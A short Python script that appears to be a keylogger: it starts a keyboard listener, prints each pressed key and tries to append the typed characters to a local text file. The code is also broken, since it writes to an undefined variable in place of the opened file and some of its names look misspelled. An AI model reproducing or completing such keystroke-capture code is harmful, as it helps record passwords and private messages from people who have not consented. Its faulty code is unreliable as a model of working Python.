from pyinput import keyboard

def keyPressed(key):
  print(str(key))
  with open("texte.txt", 'a') as f:
    try:
      char = key.char
      logkey.write(char)
    except:
      print("Error getting char")


if __name__ == "__main__":
  listener = keyboard.Listener(onpress = keyPressed)
  listener.start()
  input()
